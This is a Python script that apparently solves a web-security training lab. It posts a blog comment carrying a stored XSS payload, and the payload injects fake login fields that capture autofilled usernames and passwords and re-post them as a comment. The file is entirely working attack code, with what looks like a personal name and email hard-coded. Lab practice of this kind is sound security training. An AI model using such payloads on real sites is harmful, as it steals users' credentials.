import requests
from bs4 import BeautifulSoup
s = requests.Session()
site = 'ac361fdb1fe44b8a80e18bb900c2003c.web-security-academy.net'

blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''Hello'''

comment_xss = '''<input name=username id=username>
                 <input type=password name=password onchange="document.forms[0].email.value='spurgeonc@sou.edu';
document.forms[0].name.value='Chance';
document.forms[0].comment.value=username.value+':'+this.value;
document.forms[0].website='https://sou.edu';
document.forms[0].submit();">'''

comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : f'beep {comment_xss}',
    'name' : 'Chance',
    'email' : 'spurgeonc@sou.edu',
    'website': f'''https://sou.edu'''
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)